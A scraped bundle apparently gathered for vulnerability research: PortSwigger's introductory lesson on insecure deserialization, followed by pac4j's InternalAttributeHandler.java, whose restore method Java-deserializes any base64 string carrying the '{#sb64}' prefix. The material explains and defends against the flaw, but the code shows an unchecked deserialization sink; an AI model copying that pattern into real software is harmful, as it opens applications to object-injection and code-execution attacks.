* [Impact](/web-security/deserialization#what-is-the-impact-of-insecure-deserialization)
* [Identifying](/web-security/deserialization/exploiting#how-to-identify-insecure-deserialization)

  + [PHP serialization format](/web-security/deserialization/exploiting#php-serialization-format)
  + [Java serialization format](/web-security/deserialization/exploiting#java-serialization-format)
* [Exploiting](/web-security/deserialization/exploiting)

  + [Manipulating serialized objects](/web-security/deserialization/exploiting#manipulating-serialized-objects)

    - [Object attributes](/web-security/deserialization/exploiting#modifying-object-attributes)
    - [Data types](/web-security/deserialization/exploiting#modifying-data-types)
  + [Using application functionality](/web-security/deserialization/exploiting#using-application-functionality)
  + [Magic methods](/web-security/deserialization/exploiting#magic-methods)
  + [Injecting arbitrary objects](/web-security/deserialization/exploiting#injecting-arbitrary-objects)
  + [Gadget chains](/web-security/deserialization/exploiting#gadget-chains)

    - [Pre-built gadget chains](/web-security/deserialization/exploiting#working-with-pre-built-gadget-chains)
    - [Documented gadget chains](/web-security/deserialization/exploiting#working-with-documented-gadget-chains)
  + [Creating your own exploit](/web-security/deserialization/exploiting#creating-your-own-exploit)
  + [PHAR deserialization](/web-security/deserialization/exploiting#phar-deserialization)
  + [Memory corruption](/web-security/deserialization/exploiting#exploiting-deserialization-using-memory-corruption)
* [Preventing vulnerabilities](/web-security/deserialization#how-to-prevent-insecure-deserialization-vulnerabilities)

* [Web Security Academy](/web-security)
* [Insecure deserialization](/web-security/deserialization)

# Insecure deserialization

In this section, we'll cover what insecure deserialization is and describe how it can potentially expose websites to high-severity attacks. We'll highlight typical scenarios and demonstrate some widely applicable techniques using concrete examples of PHP, Ruby, and Java deserialization. We'll also look at some ways that you can avoid insecure deserialization vulnerabilities in your own websites.

![Insecure deserialization infographic](/web-security/images/deserialization-infographic.jpg)
#### Labs

If you're already familiar with the basic concepts behind deserialization vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.

* [View all deserialization labs](/web-security/all-labs#insecure-deserialization)
## What is serialization?

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:

* Write complex data to inter-process memory, a file, or a database
* Send complex data, for example, over a network, between different components of an application, or in an API call

Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.

### Serialization vs deserialization

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.

![Diagram of serialization and deserialization](/web-security/images/deserialization-diagram.jpg)

Many programming languages offer native support for serialization. Exactly how objects are serialized depends on the language. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. Note that all of the original object's attributes are stored in the serialized data stream, including any private fields. To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.

Be aware that when working with different programming languages, serialization may be referred to as marshalling (Ruby) or pickling (Python). These terms are synonymous with "serialization" in this context.

## What is insecure deserialization?

Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability.

An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.

## How do insecure deserialization vulnerabilities arise?

Insecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.

However, sometimes website owners think they are safe because they implement some form of additional check on the deserialized data. This approach is often ineffective because it is virtually impossible to implement validation or sanitization to account for every eventuality. These checks are also fundamentally flawed as they rely on checking the data after it has been deserialized, which in many cases will be too late to prevent the attack.

Vulnerabilities may also arise because deserialized objects are often assumed to be trustworthy. Especially when using languages with a binary serialization format, developers might think that users cannot read or manipulate the data effectively. However, while it may require more effort, it is just as possible for an attacker to exploit binary serialized objects as it is to exploit string-based formats.

Deserialization-based attacks are also made possible due to the number of dependencies that exist in modern websites. A typical site might implement many different libraries, which each have their own dependencies as well. This creates a massive pool of classes and methods that is difficult to manage securely. As an attacker can create instances of any of these classes, it is hard to predict which methods can be invoked on the malicious data. This is especially true if an attacker is able to chain together a long series of unexpected method invocations, passing data into a sink that is completely unrelated to the initial source. It is, therefore, almost impossible to anticipate the flow of malicious data and plug every potential hole.

In short, it can be argued that it is not possible to securely deserialize untrusted input.

## What is the impact of insecure deserialization?

The impact of insecure deserialization can be very severe because it provides an entry point to a massively increased attack surface. It allows an attacker to reuse existing application code in harmful ways, resulting in numerous other vulnerabilities, often remote code execution.

Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.

## How to exploit insecure deserialization vulnerabilities

Now that you're familiar with the basics of serialization and deserialization, we can look at how you can exploit insecure deserialization vulnerabilities.

#### Read more

* [Exploiting insecure deserialization vulnerabilities](/web-security/deserialization/exploiting)
## How to prevent insecure deserialization vulnerabilities

Generally speaking, deserialization of user input should be avoided unless absolutely necessary. The high severity of exploits that it potentially enables, and the difficulty in protecting against them, outweigh the benefits in many cases.

If you do need to deserialize data from untrusted sources, incorporate robust measures to make sure that the data has not been tampered with. For example, you could implement a digital signature to check the integrity of the data. However, remember that any checks must take place **before** beginning the deserialization process. Otherwise, they are of little use.

If possible, you should avoid using generic deserialization features altogether. Serialized data from these methods contains all attributes of the original object, including private fields that potentially contain sensitive information. Instead, you could create your own class-specific serialization methods so that you can at least control which fields are exposed.

Finally, remember that the vulnerability is the deserialization of user input, not the presence of gadget chains that subsequently handle the data. Don't rely on trying to eliminate gadget chains that you identify during testing. It is impractical to try and plug them all due to the web of cross-library dependencies that almost certainly exist on your website. At any given time, publicly documented memory corruption exploits are also a factor, meaning that your application may be vulnerable regardless.

## Register for free to track your learning progress

![The benefits of working through PortSwigger's Web Security Academy](/content/images/vulnerabilities/web-security-academy-footer.png)

* Practise exploiting vulnerabilities on realistic targets.
* Record your progression from Apprentice to Expert.
* See where you rank in our Hall of Fame.

REGISTER

As we use reCAPTCHA, you need to be able to access Google's servers to use this function.

Already got an account?
[Login here](https://portswigger.net/users)

Want to track your progress and have a more personalized learning experience? (It's free!)

[Sign up](/users/register)
[Login](/users?returnurl=%2fweb-security%2fdeserialization)

![Try Burp Suite for Free](/content/images/logos/burp-suite-icon.svg)
#### Find insecure deserialization vulnerabilities using Burp Suite

[Try for free](https://portswigger.net/burp)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner)
[Burp Suite Editions](/burp)
[Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting)
[SQL injection](/web-security/sql-injection)
[Cross-site request forgery](/web-security/csrf)
[XML external entity injection](/web-security/xxe)
[Directory traversal](/web-security/file-path-traversal)
[Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations)
[Testers](/testers)
[Developers](/developers)

Company

[About](/about)
[Careers](/careers)
[Contact](/about/contact)
[Legal](/legal)
[Privacy Notice](/privacy)

Insights

[Web Security Academy](/web-security)
[Blog](/blog)
[Research](/research)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/)
 [Follow us](https://twitter.com/Burp_Suite)

© 2025 PortSwigger Ltd.



=== Content from github.com_f4f70b00_20250111_134537.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpac4j%2Fpac4j%2Fblob%2F5834aeb22ad3a4369dfa572be60d7b20f5784a8f%2Fpac4j-core%2Fsrc%2Fmain%2Fjava%2Forg%2Fpac4j%2Fcore%2Fprofile%2FInternalAttributeHandler.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpac4j%2Fpac4j%2Fblob%2F5834aeb22ad3a4369dfa572be60d7b20f5784a8f%2Fpac4j-core%2Fsrc%2Fmain%2Fjava%2Forg%2Fpac4j%2Fcore%2Fprofile%2FInternalAttributeHandler.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=pac4j%2Fpac4j)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pac4j](/pac4j)
/
**[pac4j](/pac4j/pac4j)**
Public

* [Notifications](/login?return_to=%2Fpac4j%2Fpac4j) You must be signed in to change notification settings
* [Fork
  691](/login?return_to=%2Fpac4j%2Fpac4j)
* [Star
   2.4k](/login?return_to=%2Fpac4j%2Fpac4j)

* [Code](/pac4j/pac4j)
* [Pull requests
  0](/pac4j/pac4j/pulls)
* [Actions](/pac4j/pac4j/actions)
* [Projects
  0](/pac4j/pac4j/projects)
* [Security](/pac4j/pac4j/security)
* [Insights](/pac4j/pac4j/pulse)

Additional navigation options

* [Code](/pac4j/pac4j)
* [Pull requests](/pac4j/pac4j/pulls)
* [Actions](/pac4j/pac4j/actions)
* [Projects](/pac4j/pac4j/projects)
* [Security](/pac4j/pac4j/security)
* [Insights](/pac4j/pac4j/pulse)

## Files

 5834aeb
## Breadcrumbs

1. [pac4j](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f)
2. /[pac4j-core](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core)
3. /[src](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src)
4. /[main](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main)
5. /[java](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java)
6. /[org](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org)
7. /[pac4j](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j)
8. /[core](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core)
9. /[profile](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile)
/
# InternalAttributeHandler.java

Copy path Blame  Blame
## Latest commit

## History

[History](/pac4j/pac4j/commits/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java)132 lines (117 loc) · 4.94 KB 5834aeb
## Breadcrumbs

1. [pac4j](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f)
2. /[pac4j-core](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core)
3. /[src](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src)
4. /[main](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main)
5. /[java](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java)
6. /[org](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org)
7. /[pac4j](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j)
8. /[core](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core)
9. /[profile](/pac4j/pac4j/tree/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile)
/
# InternalAttributeHandler.java

Top
## File metadata and controls

* Code
* Blame

132 lines (117 loc) · 4.94 KB[Raw](https://github.com/pac4j/pac4j/raw/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132package org.pac4j.core.profile;
import org.pac4j.core.profile.converter.Converters;import org.pac4j.core.util.CommonHelper;import org.pac4j.core.util.JavaSerializationHelper;import org.slf4j.Logger;import org.slf4j.LoggerFactory;
import java.io.Serializable;import java.net.URI;import java.net.URISyntaxException;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;
/\*\* \* Internally handles attributes (set / get). \* \* @author Jerome Leleu \* @since 2.0.0 \*/public class InternalAttributeHandler {
 protected transient final Logger logger = LoggerFactory.getLogger(getClass());
 public transient static final String PREFIX = "{#"; public transient static final String PREFIX\_BOOLEAN = PREFIX + "bool}"; public transient static final String PREFIX\_INT = PREFIX + "int}"; public transient static final String PREFIX\_LONG = PREFIX + "long}"; public transient static final String PREFIX\_DATE = PREFIX + "date}"; public transient static final String PREFIX\_URI = PREFIX + "uri}"; public transient static final String PREFIX\_SB64 = PREFIX + "sb64}";
 private JavaSerializationHelper serializationHelper = new JavaSerializationHelper();
 private boolean stringify = false;
 /\*\* \* Before saving the attribute into the attributes map. \* \* @param value the original value \* @return the prepared value \*/ public Object prepare(final Object value) { if (value == null || value instanceof String || !stringify) { return value; } else { if (value instanceof Boolean) { return PREFIX\_BOOLEAN.concat(value.toString()); } else if (value instanceof Integer) { return PREFIX\_INT.concat(value.toString()); } else if (value instanceof Long) { return PREFIX\_LONG.concat(value.toString()); } else if (value instanceof Date) { return PREFIX\_DATE.concat(newSdf().format((Date) value)); } else if (value instanceof URI) { return PREFIX\_URI.concat(value.toString()); } else { return PREFIX\_SB64.concat(serializationHelper.serializeToBase64((Serializable) value)); } } }
 /\*\* \* After retrieving the attribute from the attributes map. \* \* @param value the retrieved value \* @return the restored value \*/ public Object restore(final Object value) { if (value != null && value instanceof String) { final String sValue = (String) value; if (sValue.startsWith(PREFIX)) { if (sValue.startsWith(PREFIX\_BOOLEAN)) { return Boolean.parseBoolean(sValue.substring(PREFIX\_BOOLEAN.length())); } else if (sValue.startsWith(PREFIX\_INT)) { return Integer.parseInt(sValue.substring(PREFIX\_INT.length())); } else if (sValue.startsWith(PREFIX\_LONG)) { return Long.parseLong(sValue.substring(PREFIX\_LONG.length())); } else if (sValue.startsWith(PREFIX\_DATE)) { final String d = sValue.substring(PREFIX\_DATE.length()); try { return newSdf().parse(d); } catch (final ParseException e) { logger.warn("Unable to parse stringified date: {}", d, e); } } else if (sValue.startsWith(PREFIX\_URI)) { final String uri = sValue.substring(PREFIX\_URI.length()); try { return new URI(uri); } catch (final URISyntaxException e) { logger.warn("Unable to parse stringified URI: {}", uri, e); } } else if (sValue.startsWith(PREFIX\_SB64)) { return serializationHelper.unserializeFromBase64(sValue.substring(PREFIX\_SB64.length())); } } } return value; }
 protected SimpleDateFormat newSdf() { return new SimpleDateFormat(Converters.DATE\_TZ\_GENERAL\_FORMAT); }
 public JavaSerializationHelper getSerializationHelper() { return serializationHelper; }
 public void setSerializationHelper(final JavaSerializationHelper serializationHelper) { this.serializationHelper = serializationHelper; }
 public boolean isStringify() { return stringify; }
 /\*\* \* Define if we need to turn all attributes into strings, to properly work with CAS \* (regarding Kryo serialization or service ticket validation). \* \* @param stringify whether we need to turn all attributes into strings \*/ public void setStringify(final boolean stringify) { this.stringify = stringify; }
 @Override public String toString() { return CommonHelper.toNiceString(this.getClass(), "serializationHelper", serializationHelper, "stringify", stringify); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


